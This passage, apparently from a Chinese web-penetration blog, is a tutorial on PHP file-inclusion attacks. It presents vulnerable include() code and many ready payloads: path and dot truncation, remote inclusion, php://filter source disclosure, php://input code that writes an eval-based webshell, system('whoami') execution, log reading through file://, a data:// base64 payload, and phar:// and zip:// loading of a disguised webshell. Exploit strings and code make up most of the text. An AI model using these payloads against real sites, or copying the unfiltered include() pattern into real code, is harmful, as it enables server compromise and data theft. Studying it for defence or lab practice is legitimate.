-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br></pre></td></tr></table></figure>
-
-<p><strong>点号截断</strong></p>
-<p>Exp:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php</span><br><span class="line">?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure>
-
-<p><strong>特殊符号</strong></p>
-<p>利用特色符号进行绕过，例如 ?、#、*、%20（空格）等</p>
-<p><strong>Exp：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt?</span><br></pre></td></tr></table></figure>
-
-<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>服务器的PHP配置文件中allow_url_fopen和allow_url_include设置为ON，include&#x2F;require等包含函数可以加载远程文件。如果没有对远程文件进行严格的过滤，从而执行恶意代码。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen = On（是否允许打开远程文件）</span><br><span class="line"></span><br><span class="line">allow_url_include = On（是否允许<span class="keyword">include</span>/<span class="keyword">require</span>远程文件）</span><br></pre></td></tr></table></figure>
-
-<p>漏洞代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Exp：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=http://192.168.91.133/FI/test.php%20</span><br></pre></td></tr></table></figure>
-
-<h2 id="PHP伪协议文件包含"><a href="#PHP伪协议文件包含" class="headerlink" title="PHP伪协议文件包含"></a>PHP伪协议文件包含</h2><p>PHP是门强大的语言，所以PHP里面有许多已经封装好的协议，类似于库函数，是可以直接调用的，由于没有进行严格过滤，入侵者就可以利用这些协议完成恶意操作。可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p>
-<h3 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br></pre></td></tr></table></figure>
-
-<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>这是一个访问本地文件的协议。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</span><br><span class="line"></span><br><span class="line">php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th align="left">名称</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><code>resource=&lt;要过滤的数据流&gt;</code></td>
-<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
-</tr>
-<tr>
-<td align="left"><code>read=&lt;读链的筛选列表&gt;</code></td>
-<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
-</tr>
-<tr>
-<td align="left"><code>write=&lt;写链的筛选列表&gt;</code></td>
-<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（&#96;</td>
-</tr>
-<tr>
-<td align="left"><code>&lt;；两个链的筛选列表&gt;</code></td>
-<td align="left">任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
-</tr>
-</tbody></table>
-<p>漏洞代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Exp：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">URL/?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">php://input 是个可以访问请求的原始数据的只读流。 enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的。</span><br></pre></td></tr></table></figure>
-
-<p>用法：?file&#x3D;php:&#x2F;&#x2F;input 数据利用POST传过去。</p>
-<ul>
-<li><strong>读取POST数据</strong></li>
-</ul>
-<p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
-<p>代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>写入木马</strong></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>前提：php配置文件中开启 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong>（PHP &lt; 5.3.0）</p>
-<p>就是你POST过去的PHP代码会被执行</p>
-<p>恶意代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>它会生成一个shell.php的一句话木马文件</p>
-<ul>
-<li><strong>命令执行</strong></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>前提：php配置文件中开启 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong>（PHP &lt; 5.3.0）</p>
-<p>恶意代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>读取本地文件中的内容</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>Exp:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?file=file:///var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-
-<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>data:数据流封装器。一般遇到 <strong>file_get_contents()</strong> 可以来用</p>
-<p>用法：<code>data://text/plain;base64,</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 打印 &quot;I love PHP&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意：<code>&lt;span style=&quot;color: rgb(121, 121, 121);&quot;&gt;&lt;?php phpinfo();,这类执行代码最后没有?&gt;&lt;/span&gt;</code>闭合;</p>
-<p>如果php.ini里的allow_url_include&#x3D;On（PHP &lt; 5.3.0）,就可以造成任意代码执行</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>恶意代码</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>
-
-<h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>这是 php 中用来解压打包文件的，不管后缀是什么。</p>
-<p>用法：?file&#x3D;phar: &#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php </p>
-<p>注意： PHP &gt; &#x3D;5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 </p>
-<p>步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。</p>
-<p><strong>Exp：</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=phar://shell.png/shell.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>zip 伪协议和 phar 协议类似，但是用法不一样。</p>
-<p>用法：?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名] zip:&#x2F;&#x2F;xxx.png#shell.php。</p>
-<p>前提： <strong>PHP &gt; &#x3D;5.3.0</strong></p>
-<p>注意：在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 <strong>#</strong> 在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
-<p><strong>Exp：</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=zip://shell.png%23shell.php</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
 </search>
